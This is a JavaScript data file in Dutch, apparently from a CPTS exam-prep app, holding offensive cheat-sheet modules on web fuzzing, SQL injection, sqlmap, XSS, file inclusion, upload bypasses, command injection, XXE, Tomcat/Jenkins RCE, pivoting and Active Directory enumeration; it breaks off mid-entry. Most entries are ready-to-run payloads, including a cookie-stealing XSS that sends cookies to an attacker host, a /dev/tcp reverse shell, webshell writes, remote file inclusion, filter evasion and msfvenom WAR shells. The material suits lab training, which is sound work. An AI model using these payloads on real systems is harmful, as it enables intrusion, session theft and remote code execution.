/* ══════════════════════════════════════════════════════════════
   ATTACKING WEB APPS WITH FFUF
══════════════════════════════════════════════════════════════ */
{
  id: 'ffuf', cat: 'Web Exploitatie', icon: 'ffuf', name: 'Web Fuzzing met Ffuf',
  desc: 'Directories, bestanden, extensies, vhosts en parameters systematisch fuzzen.',
  tier: 'Tier II', diff: 'Easy', done: false,
  intro: 'Ffuf is de snelste manier om verborgen content te vinden. Het principe: zet <code>FUZZ</code> als placeholder op de positie die je wilt aftasten, geef een wordlist mee, en filter de ruis weg. Beheers de <b>filters</b> — <code>-fc</code> (status code), <code>-fs</code> (size), <code>-fw</code> (words), <code>-fl</code> (lines) — want zonder filtering verdrinkt echte content in soft-404s.',
  groups: [
    { title: 'Directories & bestanden', items: [
      { h: 'Directory fuzzing', tags: ['ffuf', 'must-know'],
        d: '<code>-ac</code> kalibreert filters automatisch. Werkt in de meeste gevallen; anders handmatig filteren.',
        code: `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \\\n  -u {{URL}}/FUZZ -ac` },
      { h: 'Extensies erbij fuzzen', tags: ['ffuf'],
        d: 'Kies extensies op basis van de tech-stack (php, aspx, jsp, txt, bak, old).',
        code: `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \\\n  -u {{URL}}/FUZZ -e .php,.txt,.bak,.old,.zip -ac` },
      { h: 'Recursief fuzzen', tags: ['ffuf'],
        code: `ffuf -w wordlist.txt -u {{URL}}/FUZZ -recursion -recursion-depth 2 -e .php -ac` },
    ]},
    { title: 'Vhosts & subdomeinen', items: [
      { h: 'Vhost fuzzing (Host-header)', tags: ['ffuf', 'vhost', 'must-know'],
        d: 'Filter op de grootte van de "niet gevonden"-baseline met <code>-fs</code>.',
        code: `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \\\n  -u {{URL}} -H "Host: FUZZ.{{DOMAIN}}" -fs 0` },
    ]},
    { title: 'Parameters & waarden', items: [
      { h: 'GET/POST parameters vinden', tags: ['ffuf', 'fuzz'],
        d: 'Verborgen parameters zijn vaak de ingang naar LFI, IDOR of debug-functies.',
        code: `# GET:\nffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \\\n  -u "{{URL}}/index.php?FUZZ=key" -fs 0\n# POST:\nffuf -w params.txt -u {{URL}}/index.php -X POST \\\n  -d "FUZZ=key" -H "Content-Type: application/x-www-form-urlencoded" -fs 0` },
      { h: 'Waarde van een parameter fuzzen', tags: ['ffuf', 'fuzz'],
        d: 'Bv. geldige gebruikers-ID\'s, bestandsnamen of PIN-codes brute-forcen.',
        code: `ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \\\n  -u "{{URL}}/reset?pin=FUZZ" -fc 401` },
    ]}
  ]
},
/* ══════════════════════════════════════════════════════════════
   SQL INJECTION FUNDAMENTALS
══════════════════════════════════════════════════════════════ */
{
  id: 'sqli', cat: 'Web Exploitatie', icon: 'sqli', name: 'SQL Injection',
  desc: 'Van detectie tot UNION-based dumps, auth bypass en file read/write.',
  tier: 'Tier II', diff: 'Medium', done: false,
  intro: 'SQL injection ontstaat als user-input ongefilterd in een SQL-query belandt. Je kunt dan de querylogica breken (auth bypass), data uit andere tabellen trekken (UNION), of bij hoge rechten zelfs bestanden lezen/schrijven en RCE bereiken. Werk methodisch: <b>detecteer</b> → <b>bepaal kolomaantal</b> → <b>vind output-kolommen</b> → <b>enumereer database</b> → <b>dump</b>. Ken de payloads uit je hoofd; in het examen heb je geen tijd om te googelen.',
  groups: [
    { title: 'Detectie & auth bypass', items: [
      { h: 'Detecteren', tags: ['sqli', 'must-know'],
        d: 'Injecteer een quote en kijk of de app breekt (error of ander gedrag). Test zowel <code>\'</code> als <code>"</code> en numerieke context.',
        code: `'\n"\n' OR 1=1-- -\n1' AND SLEEP(5)-- -    # time-based blind bevestiging` },
      { h: 'Authentication bypass', tags: ['sqli', 'must-know'],
        d: 'Maak de WHERE-clause altijd waar. <code>-- -</code> becommentarieert de rest van de query weg.',
        code: `admin' -- -\n' OR '1'='1\n' OR 1=1 LIMIT 1-- -` },
    ]},
    { title: 'UNION-based extraction', intro: 'Met UNION plak je een tweede SELECT aan het resultaat. Vereist: even veel kolommen én compatibele types.', items: [
      { h: 'Kolomaantal bepalen', tags: ['sqli', 'union', 'must-know'],
        d: 'Verhoog <code>ORDER BY</code> tot je een error krijgt — dat getal min 1 is het kolomaantal. Of gebruik UNION met NULLs.',
        code: `' ORDER BY 1-- -\n' ORDER BY 2-- -\n' UNION SELECT NULL,NULL,NULL-- -` },
      { h: 'Output-kolommen & DB-info', tags: ['sqli', 'union'],
        d: 'Vind welke kolommen op de pagina verschijnen, lees dan versie/DB/user.',
        code: `' UNION SELECT 1,2,3-- -\n' UNION SELECT database(),version(),user()-- -` },
      { h: 'Schema enumereren (MySQL)', tags: ['sqli', 'union', 'must-know'],
        d: '<code>information_schema</code> bevat alle tabellen en kolommen. Zo vind je waar de wachtwoorden staan.',
        code: `' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()-- -\n' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -\n' UNION SELECT username,password,3 FROM users-- -` },
    ]},
    { title: 'File read/write & RCE', intro: 'Bij voldoende DB-privileges (FILE) kun je het OS raken. Vaak de brug van SQLi naar shell.', items: [
      { h: 'Bestanden lezen', tags: ['sqli', 'file'],
        code: `' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -` },
      { h: 'Webshell schrijven', tags: ['sqli', 'file', 'rce'],
        d: 'Vereist FILE-privilege, kennis van de webroot, en dat <code>secure_file_priv</code> leeg is.',
        code: `' UNION SELECT '<?php system($_GET[1]); ?>',2,3 INTO OUTFILE '/var/www/html/s.php'-- -` },
    ]}
  ]
},

/* ══════════════════════════════════════════════════════════════
   SQLMAP ESSENTIALS
══════════════════════════════════════════════════════════════ */
{
  id: 'sqlmap', cat: 'Web Exploitatie', icon: 'sqlmap', name: 'SQLMap Essentials',
  desc: 'Geautomatiseerde SQLi-detectie en exploitatie, inclusief RCE en WAF-bypass.',
  tier: 'Tier II', diff: 'Easy', done: false,
  intro: 'SQLMap automatiseert alles uit de SQLi-module: detectie, kolomtelling, enumeratie en dumpen — inclusief lastige blind- en time-based gevallen. De kracht zit in het correct aanleveren van het request. De beste aanpak: onderschep het kwetsbare request in Burp, sla het op als bestand en voer het aan SQLMap met <code>-r</code>. Verhoog <code>--level</code> en <code>--risk</code> als de simpele scan niets vindt.',
  groups: [
    { title: 'Detectie', items: [
      { h: 'Basis-scan', tags: ['sqlmap', 'must-know'],
        d: 'Markeer de te testen parameter met <code>-p</code>. Voor POST/cookies is een opgeslagen request (<code>-r</code>) het betrouwbaarst.',
        code: `sqlmap -u "{{URL}}/index.php?id=1" -p id --batch\nsqlmap -r request.txt --batch` },
      { h: 'Dieper zoeken (level/risk)', tags: ['sqlmap'],
        d: '<code>--level</code> (1-5) test meer plekken/payloads, <code>--risk</code> (1-3) test riskantere payloads. Verhoog stapsgewijs.',
        code: `sqlmap -r request.txt --level=5 --risk=3 --batch` },
    ]},
    { title: 'Enumeratie & dumpen', items: [
      { h: 'Databases → tabellen → dump', tags: ['sqlmap', 'must-know'],
        code: `sqlmap -r request.txt --dbs\nsqlmap -r request.txt -D app_db --tables\nsqlmap -r request.txt -D app_db -T users --columns\nsqlmap -r request.txt -D app_db -T users --dump` },
      { h: 'Snel alles dumpen', tags: ['sqlmap'],
        code: `sqlmap -r request.txt --dump-all --exclude-sysdbs --batch` },
    ]},
    { title: 'OS-toegang & bypass', items: [
      { h: 'OS-shell / file access', tags: ['sqlmap', 'rce'],
        d: 'Bij voldoende rechten: interactieve OS-shell, of bestanden lezen/schrijven.',
        code: `sqlmap -r request.txt --os-shell\nsqlmap -r request.txt --file-read=/etc/passwd\nsqlmap -r request.txt --file-write=shell.php --file-dest=/var/www/html/shell.php` },
      { h: 'WAF-bypass met tamper-scripts', tags: ['sqlmap', 'evasion'],
        d: 'Tamper-scripts muteren payloads om filters te omzeilen (bv. spaties → comments).',
        code: `sqlmap -r request.txt --tamper=space2comment,between --random-agent --batch` },
    ]}
  ]
},
/* ══════════════════════════════════════════════════════════════
   CROSS-SITE SCRIPTING (XSS)
══════════════════════════════════════════════════════════════ */
{
  id: 'xss', cat: 'Web Exploitatie', icon: 'xss', name: 'Cross-Site Scripting (XSS)',
  desc: 'Reflected, stored en DOM-based XSS — van detectie tot cookie-diefstal.',
  tier: 'Tier II', diff: 'Easy', done: false,
  intro: 'XSS laat je JavaScript uitvoeren in de browser van een ander. Drie types: <b>reflected</b> (payload in het request, direct teruggekaatst), <b>stored</b> (opgeslagen op de server, treft elke bezoeker — het gevaarlijkst), en <b>DOM-based</b> (client-side JS verwerkt onveilige input). Impact: sessiecookies stelen, acties uitvoeren namens het slachtoffer, of een admin-account overnemen. Test elk input-veld dat ergens weer op de pagina verschijnt.',
  groups: [
    { title: 'Detectie', items: [
      { h: 'Basispayloads', tags: ['xss', 'must-know'],
        d: 'Begin simpel; werkt de alert, dan verfijn je. <code>&lt;script&gt;</code> wordt vaak gefilterd — event-handlers minder.',
        code: `<script>alert(document.domain)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n"><script>alert(1)</script>` },
      { h: 'Filters omzeilen', tags: ['xss', 'evasion'],
        d: 'Speel met hoofdletters, ontbrekende sluittags en alternatieve events als iets gefilterd wordt.',
        code: `<sCrIpT>alert(1)</sCrIpT>\n<img src=x onerror="alert\`1\`">\n<body onpageshow=alert(1)>\njavascript:alert(1)` },
    ]},
    { title: 'Exploitatie', intro: 'Bij stored XSS in een admin-panel is cookie-diefstal de klassieke weg naar accountovername. Draai een listener om de cookie op te vangen.', items: [
      { h: 'Sessiecookie stelen', tags: ['xss', 'must-know'],
        d: 'Start eerst een webserver op je attacker; de payload stuurt de cookie van het slachtoffer naar jou.',
        code: `<script>document.location='http://{{LHOST}}/c='+document.cookie</script>\n<script>new Image().src='http://{{LHOST}}/c='+document.cookie</script>\n# op attacker de cookie opvangen:\nphp -S 0.0.0.0:80` },
      { h: 'Keylogger / phishing', tags: ['xss'],
        d: 'Stored XSS kan een nep-loginform injecteren of toetsaanslagen naar jou sturen — sterk in social-engineering scenario\'s.' },
      { h: 'Automatisch scannen (XSStrike)', tags: ['xss', 'tooling'],
        code: `xsstrike -u "{{URL}}/search?q=test"` },
    ]}
  ]
},

/* ══════════════════════════════════════════════════════════════
   FILE INCLUSION (LFI / RFI)
══════════════════════════════════════════════════════════════ */
{
  id: 'lfi', cat: 'Web Exploitatie', icon: 'lfi', name: 'File Inclusion (LFI / RFI)',
  desc: 'Bestanden inladen, path traversal, log poisoning en PHP wrappers naar RCE.',
  tier: 'Tier II', diff: 'Medium', done: false,
  intro: 'File inclusion ontstaat als een app een bestandspad uit user-input laadt. <b>LFI</b> (Local) leest bestanden van de server; <b>RFI</b> (Remote) laadt een bestand van jouw server — direct RCE. Zelfs pure LFI leidt vaak tot RCE via <b>PHP wrappers</b> of <b>log poisoning</b>. Herken het aan parameters als <code>?page=</code>, <code>?file=</code>, <code>?lang=</code>, <code>?include=</code>.',
  groups: [
    { title: 'Detectie & path traversal', items: [
      { h: 'Basis LFI / traversal', tags: ['lfi', 'must-know'],
        d: 'Klim omhoog met <code>../</code> tot je een bekend bestand raakt. Windows gebruikt backslashes en andere paden.',
        code: `{{URL}}/index.php?page=/etc/passwd\n{{URL}}/index.php?page=../../../../etc/passwd\n{{URL}}/index.php?page=..\\..\\..\\windows\\win.ini` },
      { h: 'Filters omzeilen', tags: ['lfi', 'evasion'],
        d: 'Bij naïeve filters: null-byte (oud PHP), dubbele encoding, of path-truncatie.',
        code: `....//....//etc/passwd\n%2e%2e%2fetc%2fpasswd\n..%252f..%252fetc%252fpasswd` },
    ]},
    { title: 'PHP wrappers', intro: 'Wrappers zetten LFI om in bron-uitlezing of RCE. Onmisbaar in het examen.', items: [
      { h: 'php://filter — broncode lezen', tags: ['lfi', 'php', 'must-know'],
        d: 'Base64-encodeer PHP-bestanden zodat je de broncode (met credentials/DB-config) leest i.p.v. hem uit te voeren.',
        code: `{{URL}}/index.php?page=php://filter/convert.base64-encode/resource=config.php` },
      { h: 'data:// & php://input — RCE', tags: ['lfi', 'php', 'rce'],
        d: 'Voer direct PHP uit als <code>allow_url_include</code> aanstaat.',
        code: `{{URL}}/index.php?page=data://text/plain,<?php system('id'); ?>\n# via POST-body:\ncurl "{{URL}}/index.php?page=php://input" --data '<?php system("id"); ?>'` },
    ]},
    { title: 'LFI → RCE technieken', items: [
      { h: 'Log poisoning', tags: ['lfi', 'rce', 'must-know'],
        d: 'Injecteer PHP in een logbestand (via User-Agent), include dat log dan via LFI om het uit te voeren.',
        code: `# 1) vergiftig de log via de User-Agent:\ncurl {{URL}} -H "User-Agent: <?php system(\\$_GET['c']); ?>"\n# 2) include het log en voer uit:\n{{URL}}/index.php?page=/var/log/apache2/access.log&c=id` },
      { h: 'RFI (remote include)', tags: ['rfi', 'rce'],
        d: 'Als <code>allow_url_include</code> aanstaat: host je eigen PHP-shell en laat het target hem laden.',
        code: `# attacker: php -S 0.0.0.0:80  (met shell.php in map)\n{{URL}}/index.php?page=http://{{LHOST}}/shell.php` },
      { h: 'Fuzzen naar inclusie-punten', tags: ['lfi', 'fuzz'],
        code: `ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\\n  -u "{{URL}}/index.php?page=FUZZ" -fs 0` },
    ]}
  ]
},

/* ══════════════════════════════════════════════════════════════
   FILE UPLOAD ATTACKS
══════════════════════════════════════════════════════════════ */
{
  id: 'upload', cat: 'Web Exploitatie', icon: 'upload', name: 'File Upload Attacks',
  desc: 'Filter-bypass, dubbele extensies, MIME-spoofing en magic bytes naar shell.',
  tier: 'Tier II', diff: 'Medium', done: false,
  intro: 'Een upload-functie die de inhoud niet goed valideert = een directe weg naar RCE: upload een web shell en roep hem aan. De verdediging bestaat uit extensie-, MIME- en inhoudscontroles; jouw werk is elke laag omzeilen. Sleutelvraag na een geslaagde upload: <b>waar</b> landt het bestand en <b>voert de server het uit</b>? Zonder uitvoering heb je alleen een bestand, geen shell.',
  groups: [
    { title: 'Filters omzeilen', items: [
      { h: 'Blacklist-bypass (alternatieve extensies)', tags: ['upload', 'must-know'],
        d: 'Als <code>.php</code> geblokkeerd is, probeer varianten die de server nog steeds als PHP uitvoert.',
        code: `shell.phtml\nshell.php3\nshell.php5\nshell.phar\nshell.pHp` },
      { h: 'Dubbele extensie & null-byte', tags: ['upload', 'evasion'],
        code: `shell.php.jpg\nshell.jpg.php\nshell.php%00.jpg` },
      { h: 'MIME-type spoofen', tags: ['upload', 'evasion'],
        d: 'Onderschep in Burp en zet de <code>Content-Type</code> naar <code>image/png</code> terwijl de inhoud PHP is.',
        code: `Content-Type: image/png` },
      { h: 'Magic bytes toevoegen', tags: ['upload', 'evasion'],
        d: 'Bij inhoudscontrole (getimagesize): begin het bestand met een geldige image-header, plak je PHP erachter.',
        code: `# GIF-header voor de payload:\necho -n 'GIF8;' > shell.php\necho '<?php system($_GET[1]); ?>' >> shell.php` },
    ]},
    { title: 'Na de upload', items: [
      { h: 'Upload-locatie vinden & aanroepen', tags: ['upload', 'rce', 'must-know'],
        d: 'Zoek de map waar uploads landen (vaak <code>/uploads/</code>, <code>/images/</code>, <code>/files/</code>) en roep je shell aan.',
        code: `# locatie fuzzen:\nffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u {{URL}}/FUZZ/shell.php\n# aanroepen:\ncurl "{{URL}}/uploads/shell.php?1=id"` },
      { h: '.htaccess-truc', tags: ['upload', 'evasion'],
        d: 'Als je een <code>.htaccess</code> mag uploaden, dwing je Apache om een onschuldige extensie als PHP uit te voeren.',
        code: `# inhoud .htaccess:\nAddType application/x-httpd-php .jpg` },
    ]}
  ]
},
/* ══════════════════════════════════════════════════════════════
   COMMAND INJECTION
══════════════════════════════════════════════════════════════ */
{
  id: 'cmdi', cat: 'Web Exploitatie', icon: 'cmdi', name: 'Command Injection',
  desc: 'OS-commando\'s injecteren via operators, plus filter-bypass technieken.',
  tier: 'Tier II', diff: 'Medium', done: false,
  intro: 'Command injection ontstaat als een app user-input doorgeeft aan een OS-commando (bv. een ping-tool dat je IP aan <code>ping</code> plakt). Met shell-operators voeg je je eigen commando toe. Dit is direct RCE — een van de krachtigste webbugs. Test elk veld dat systeemfunctionaliteit aanroept (ping, nslookup, converteren, bestandsnamen).',
  groups: [
    { title: 'Injectie-operators', items: [
      { h: 'Commando\'s aan elkaar plakken', tags: ['cmdi', 'must-know'],
        d: '<code>;</code> en newline draaien sequentieel; <code>&&</code>/<code>||</code> conditioneel; <code>|</code> pipet; backticks/<code>$()</code> substitueren.',
        code: `; id\n&& id\n| id\n|| id\n$(id)\n%0a id       # URL-encoded newline` },
      { h: 'Voorbeeld in een parameter', tags: ['cmdi'],
        code: `{{URL}}/ping.php?ip=127.0.0.1;id\n{{URL}}/ping.php?ip=127.0.0.1%0Aid` },
    ]},
    { title: 'Filter-bypass', intro: 'Filters blokkeren vaak spaties, slashes of specifieke woorden. Er zijn shell-trucs voor elke laag.', items: [
      { h: 'Spaties omzeilen', tags: ['cmdi', 'evasion'],
        d: 'Als spaties gefilterd zijn: gebruik <code>\${IFS}</code>, tabs of brace-expansion.',
        code: `cat\${IFS}/etc/passwd\n{cat,/etc/passwd}\ncat</etc/passwd` },
      { h: 'Karakters/woorden omzeilen', tags: ['cmdi', 'evasion'],
        d: 'Breek geblokkeerde strings met lege variabelen, quotes of concatenatie op.',
        code: `w'h'o'am'i\nw\\ho\\am\\i\na=who;b=ami;$a$b\n# base64-truc:\necho aWQ= | base64 -d | bash` },
      { h: 'Reverse shell via cmdi', tags: ['cmdi', 'rce', 'must-know'],
        d: 'Zodra je RCE bevestigt: ga direct naar een reverse shell voor een stabiele voet aan de grond.',
        code: `;bash -c 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1'` },
    ]}
  ]
},

/* ══════════════════════════════════════════════════════════════
   WEB ATTACKS (IDOR, XXE, verb tampering)
══════════════════════════════════════════════════════════════ */
{
  id: 'webattacks', cat: 'Web Exploitatie', icon: 'webattacks', name: 'Web Attacks (IDOR · XXE · Verb Tampering)',
  desc: 'Logische en injectie-fouten: IDOR, HTTP verb tampering en XXE.',
  tier: 'Tier II', diff: 'Medium', done: false,
  intro: 'Deze module bundelt drie veelvoorkomende webaanvallen buiten de klassieke injecties om. <b>IDOR</b> misbruikt voorspelbare object-referenties (toegang tot andermans data). <b>HTTP verb tampering</b> omzeilt access-controls die alleen op GET/POST filteren. <b>XXE</b> misbruikt XML-parsers om bestanden te lezen of SSRF te doen. Alle drie draaien om <b>access control en vertrouwde input</b> — vaak hoog-impact en makkelijk over het hoofd gezien.',
  groups: [
    { title: 'IDOR', intro: 'Insecure Direct Object Reference: de app checkt niet of jij eigenaar bent van het opgevraagde object.', items: [
      { h: 'Detecteren & exploiteren', tags: ['idor', 'must-know'],
        d: 'Verander een ID in de URL, body of cookie naar dat van een ander. Krijg je hun data? Dan is het IDOR. Enumereer met ffuf/Intruder.',
        code: `{{URL}}/api/user/1002/profile      # -> probeer 1001, 1003 ...\n{{URL}}/download?file=invoice_1002.pdf\n# massaal ophalen:\nffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \\\n  -u "{{URL}}/api/user/FUZZ/profile" -H "Cookie: session=..." -mc 200` },
    ]},
    { title: 'HTTP Verb Tampering', items: [
      { h: 'Access control omzeilen', tags: ['verb-tampering'],
        d: 'Als een pagina alleen GET/POST beperkt, probeer HEAD, PUT of een onverwachte methode om de check te omzeilen.',
        code: `curl -X PUT {{URL}}/admin/config\ncurl -X HEAD {{URL}}/admin\n# willekeurige methode:\ncurl -X HACK {{URL}}/admin/delete?id=1` },
    ]},
    { title: 'XXE', intro: 'XML External Entity: de parser verwerkt een externe entiteit die jij definieert — leidt tot file-read, SSRF of DoS.', items: [
      { h: 'Bestand lezen via XXE', tags: ['xxe', 'must-know'],
        d: 'Definieer een entiteit die een lokaal bestand inlaadt; die verschijnt in de response.',
        code: `<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root><name>&xxe;</name></root>` },
      { h: 'Blind XXE (out-of-band)', tags: ['xxe', 'oob'],
        d: 'Als de output niet terugkomt: laat de parser naar jouw server verbinden (SSRF) of exfiltreer via een externe DTD.',
        code: `<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://{{LHOST}}/evil.dtd"> %ext;]>` },
    ]}
  ]
},

/* ══════════════════════════════════════════════════════════════
   ATTACKING COMMON APPLICATIONS
══════════════════════════════════════════════════════════════ */
{
  id: 'apps', cat: 'Web Exploitatie', icon: 'apps', name: 'Attacking Common Applications',
  desc: 'CMS en dev-tools: WordPress, Joomla, Tomcat, Jenkins, Gitlab, Splunk.',
  tier: 'Tier II', diff: 'Medium', done: false,
  intro: 'In de praktijk stuit je zelden op maatwerk — meestal draaien bekende applicaties (CMS\'en, CI/CD-tools, dashboards) met standaard-credentials of bekende CVE\'s. Herken de applicatie, bepaal de versie, en zoek gericht. Veel van deze tools bieden een "legitieme" weg naar RCE (plugins, script-consoles, deploy-functies) als je maar admin bent.',
  groups: [
    { title: 'Herkennen & versie bepalen', items: [
      { h: 'Applicatie fingerprinten', tags: ['apps', 'recon', 'must-know'],
        code: `whatweb {{URL}}\ncurl -s {{URL}} | grep -iE 'wp-content|joomla|drupal|generator'\nnuclei -u {{URL}} -t http/technologies/` },
    ]},
    { title: 'CMS: WordPress / Joomla / Drupal', items: [
      { h: 'WordPress (wpscan)', tags: ['wordpress', 'must-know'],
        d: 'Enumereer users en kwetsbare plugins, brute-force dan de login. Admin → plugin-editor = RCE.',
        code: `wpscan --url {{URL}} --enumerate u,vp,vt --api-token <TOKEN>\nwpscan --url {{URL}} -U users.txt -P {{WORDLIST}}` },
      { h: 'Joomla / Drupal', tags: ['joomla', 'drupal'],
        code: `joomscan -u {{URL}}\ndroopescan scan drupal -u {{URL}}` },
    ]},
    { title: 'Dev & infra: Tomcat / Jenkins / Gitlab / Splunk', items: [
      { h: 'Tomcat Manager → WAR deploy', tags: ['tomcat', 'rce', 'must-know'],
        d: 'Standaard-creds (tomcat/tomcat, admin/admin) geven toegang tot Manager; deploy een malafide WAR voor RCE.',
        code: `msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f war -o shell.war\ncurl -u tomcat:tomcat -T shell.war "{{URL}}/manager/text/deploy?path=/shell"\ncurl "{{URL}}/shell/"` },
      { h: 'Jenkins Script Console (Groovy RCE)', tags: ['jenkins', 'rce'],
        d: 'Als je bij <code>/script</code> komt, is het game over — voer Groovy uit die een reverse shell opzet.',
        code: `# in /script:\nString host="{{LHOST}}";int port={{LPORT}};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);/* ...pipe streams... */` },
      { h: 'Splunk / Gitlab', tags: ['splunk', 'gitlab'],
        d: 'Splunk universal forwarder = RCE via een malafide app-package. Gitlab: check versie voor bekende RCE-CVE\'s.',
        code: `# Splunk RCE PoC:\ngit clone https://github.com/cnotin/SplunkWhisperer2\n# Gitlab versie:\ncurl -s {{URL}}/help | grep -i version` },
    ]}
  ]
},
/* ══════════════════════════════════════════════════════════════
   PIVOTING, TUNNELING & PORT FORWARDING
══════════════════════════════════════════════════════════════ */
{
  id: 'pivot', cat: 'Netwerk & Active Directory', icon: 'pivot', name: 'Pivoting, Tunneling & Port Forwarding',
  desc: 'Van de eerste host naar interne subnets: SSH-tunnels, chisel, proxychains, ligolo.',
  tier: 'Tier II', diff: 'Medium', done: false,
  intro: 'Na je eerste voet aan de grond zit het echte doel bijna altijd in een intern netwerk dat je vanaf je aanvalsmachine niet direct kunt bereiken. <b>Pivoting</b> gebruikt de gecompromitteerde host als doorgeefluik. Kernbegrippen: <b>local forward</b> (poort op jou → target-side dienst), <b>remote/reverse forward</b> (dienst op jou beschikbaar op target-side), en een <b>SOCKS-proxy</b> die al je tools via de pivot routeert (met proxychains).',
  groups: [
    { title: 'SSH tunneling', intro: 'Als je SSH-toegang tot de pivot-host hebt, heb je alles wat je nodig hebt zonder extra tools te uploaden.', items: [
      { h: 'Local port forward (-L)', tags: ['ssh', 'pivot', 'must-know'],
        d: 'Maak een interne dienst lokaal bereikbaar. Voorbeeld: intern <code>172.16.5.10:3306</code> wordt <code>127.0.0.1:3306</code> op jou.',
        code: `ssh -L 3306:172.16.5.10:3306 {{USER}}@{{IP}}\n# nu: mysql -h 127.0.0.1` },
      { h: 'Dynamic SOCKS-proxy (-D)', tags: ['ssh', 'pivot', 'must-know'],
        d: 'Eén tunnel voor het hele interne netwerk. Combineer met proxychains om elke tool erdoor te sturen.',
        code: `ssh -D 1080 {{USER}}@{{IP}}\n# /etc/proxychains4.conf:  socks5 127.0.0.1 1080\nproxychains nmap -sT -Pn 172.16.5.0/24\nproxychains netexec smb 172.16.5.10` },
      { h: 'Remote/reverse forward (-R)', tags: ['ssh', 'pivot'],
        d: 'Maak een dienst op jóuw machine bereikbaar vanaf de target-side — handig voor callbacks door NAT heen.',
        code: `ssh -R 8000:127.0.0.1:8000 {{USER}}@{{IP}}` },
    ]},
    { title: 'Chisel (geen SSH nodig)', intro: 'Chisel bouwt een tunnel over HTTP — ideaal als je alleen een web-RCE of kale shell hebt.', items: [
      { h: 'Reverse SOCKS via chisel', tags: ['chisel', 'pivot', 'must-know'],
        d: 'Server op je attacker, client op de pivot verbindt terug en opent een SOCKS5-proxy op je attacker.',
        code: `# attacker:\nchisel server -p {{LPORT}} --reverse\n# target:\n./chisel client {{LHOST}}:{{LPORT}} R:socks\n# daarna via proxychains (socks5 127.0.0.1 1080)` },
    ]},
    { title: 'Ligolo-ng (modern)', items: [
      { h: 'Tunnel met een virtuele interface', tags: ['ligolo', 'pivot'],
        d: 'Ligolo geeft je een echte route naar het interne subnet — geen proxychains nodig, tools werken native.',
        code: `# attacker:\nsudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:{{LPORT}}\n# target:\n./agent -connect {{LHOST}}:{{LPORT}} -ignore-cert\n# in ligolo: session -> start; op attacker: ip route add 172.16.5.0/24 dev ligolo` },
    ]},
    { title: 'Windows-specifiek', items: [
      { h: 'Port forward met netsh', tags: ['windows', 'pivot'],
        d: 'Ingebouwd op Windows; geen tool nodig. Vereist admin.',
        code: `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.5.10` },
      { h: 'Plink / socat relay', tags: ['windows', 'pivot'],
        code: `plink.exe -R 8080:127.0.0.1:3389 {{USER}}@{{LHOST}}\nsocat TCP-LISTEN:8080,fork TCP:172.16.5.10:3389` },
    ]}
  ]
},

/* ══════════════════════════════════════════════════════════════
   ACTIVE DIRECTORY ENUMERATION & ATTACKS
══════════════════════════════════════════════════════════════ */
{
  id: 'ad', cat: 'Netwerk & Active Directory', icon: 'ad', name: 'Active Directory Enumeration & Attacks',
  desc: 'Het hart van CPTS: enumeratie, Kerberos-aanvallen, BloodHound, lateral movement, DCSync.',
  tier: 'Tier II', diff: 'Hard', done: false,
  intro: 'Active Directory is <b>de</b> centrale module van CPTS en van bijna elk echt intern assessment. Het draait om het misbruiken van vertrouwensrelaties: van een enkele set credentials werk je via enumeratie (BloodHound), Kerberos-aanvallen (Kerberoasting, AS-REP roasting), en ACL-/delegatie-misbruik naar <b>Domain Admin</b>. De gouden regel: enumereer volledig vóór je aanvalt, en herbruik elke credential overal. Onderstaande flow volgt de typische aanvalsketen.',
  groups: [
    { title: '1 · Initiële enumeratie', intro: 'Vaak begin je met één laag-geprivilegieerd account (of zelfs zonder). Breng gebruikers, groepen, computers en policies in kaart.', items: [
      { h: 'Domein-overzicht (netexec)', tags: ['ad', 'enum', 'must-know'],
        d: 'Bevestig domeinnaam, DC, en test je credentials meteen op geldigheid en lokale-admin-rechten.',
        code: `netexec smb {{IP}}\nnetexec smb {{IP}} -u {{USER}} -p '{{PASS}}'\nnetexec smb {{IP}} -u {{USER}} -p '{{PASS}}' --users --groups --pass-pol` },
      { h: 'Users & groups via RPC/LDAP', tags: ['ad', 'enum'],
        code: `rpcclient -U '{{USER}}%{{PASS}}' {{IP}} -c 'enumdomusers'\nldapsearch -x -H ldap://{{IP}} -D '{{USER}}@{{DOMAIN}}' -w '{{PASS}}' \\\n  -b 'DC=target,DC=htb' '(objectClass=user)' sAMAccountName` },
      { h: 'Volledige enum met enum4linux-ng', tags: ['ad', 'enum'],
        code: `enum4linux-ng -A -u '{{USER}}' -p '{{PASS}}' {{IP}}` },
      { h: 'Users spider (geen creds) — RID brute', tags: ['ad', 'enum'],
        code: `netexec smb {{IP}} -u '' -p '' --rid-brute\nlookupsid.py anonymous@{{IP}}` },
    ]},
    { title: '2 · BloodHound (aanvalspaden)', intro: 'BloodHound verzamelt AD-relaties en toont grafisch de kortste weg naar Domain Admin. Onmisbaar — het vindt paden die je handmatig nooit ziet.', items: [
      { h: 'Data verzamelen', tags: ['ad', 'bloodhound', 'must-know'],
        d: 'Draai een collector met je credentials; laad de zip daarna in de BloodHound-GUI.',
        code: `bloodhound-python -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} -ns {{IP}} -c All\n# of vanaf Windows: SharpHound.exe -c All` },
      { h: 'Analyseren', tags: ['ad', 'bloodhound'],
